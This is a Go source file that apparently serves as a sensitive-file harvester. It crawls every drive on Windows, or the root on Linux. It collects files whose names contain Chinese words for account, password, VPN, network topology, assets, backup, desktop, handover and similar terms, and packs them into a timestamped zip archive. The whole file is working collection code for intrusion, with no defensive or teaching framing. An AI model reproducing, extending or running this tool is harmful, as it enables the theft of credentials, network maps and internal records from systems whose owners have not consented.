package find

import (
	"archive/zip"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"regexp"
	"runtime"
	"time"
)

var (
	excludeDirsWin   = []string{"Windows", "ProgramData"}
	excludeDirsLinux = []string{"dev", "proc", "sys", "run", "mnt", "tmp"}

	filePattern = regexp.MustCompile(`(?i).*账.*|.*密码.*|.*录.*|.*构.*|.*组.*|.*VPN.*|.*简.*|.*拓扑.*|.*历.*|.*记.*|.*说.*|.*服.*|.*地址.*|.*资产.*|.*表.*|.*部.*|.*使用.*|.*单.*|.*表.*|.*配.*|.*介绍.*|.*工.*|.*图.*|.*人.*|.*备份.*|.*.册.*|.*桌面.*|.*交接.*|.*维.*`)
)

func Findfile() {
	roots, err := getRoots()
	if err != nil {
		fmt.Println("Error getting roots:", err)
		return
	}

	// Generate unique zip file name with timestamp
	zipFileName := fmt.Sprintf("files_%s.zip", time.Now().Format("20060102150405"))

	zipFileWriter, err := os.Create(zipFileName)
	if err != nil {
		fmt.Println("Error creating zip file:", err)
		return
	}
	defer zipFileWriter.Close()

	writer := zip.NewWriter(zipFileWriter)
	defer writer.Close()

	for _, root := range roots {
		err := filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
			if err != nil {
				fmt.Printf("Error accessing %s: %v\n", path, err)
				return nil
			}

			var excludeDirs []string
			if runtime.GOOS == "windows" {
				excludeDirs = excludeDirsWin
			} else {
				excludeDirs = excludeDirsLinux
			}
			for _, dir := range excludeDirs {
				if info.IsDir() && dir == info.Name() {
					return filepath.SkipDir
				}
			}

			if !info.IsDir() && filePattern.MatchString(info.Name()) {
				fmt.Println("Found:", path)
				err := addToZip(writer, path)
				if err != nil {
					fmt.Printf("Error adding %s to zip: %v\n", path, err)
				}
			}
			return nil
		})
		if err != nil {
			fmt.Println("Error walking filesystem:", err)
			return
		}
	}

	fmt.Println("Done! Files are packed into", zipFileName)
}

func getRoots() ([]string, error) {
	var roots []string
	if runtime.GOOS == "windows" {
		for _, drive := range "ABCDEFGHIJKLMNOPQRSTUVWXYZ" {
			root := string(drive) + ":\\"
			_, err := os.Open(root)
			if err != nil {
				fmt.Printf("Error accessing %s: %v\n", root, err)
				continue
			}
			roots = append(roots, root)
		}
	} else {
		roots = append(roots, "/")
	}
	return roots, nil
}

func addToZip(writer *zip.Writer, fileName string) error {
	file, err := os.Open(fileName)
	if err != nil {
		return err
	}
	defer file.Close()

	fileInZip, err := writer.Create(filepath.Base(fileName))
	if err != nil {
		return err
	}

	_, err = io.Copy(fileInZip, file)
	if err != nil {
		return err
	}

	return nil
}
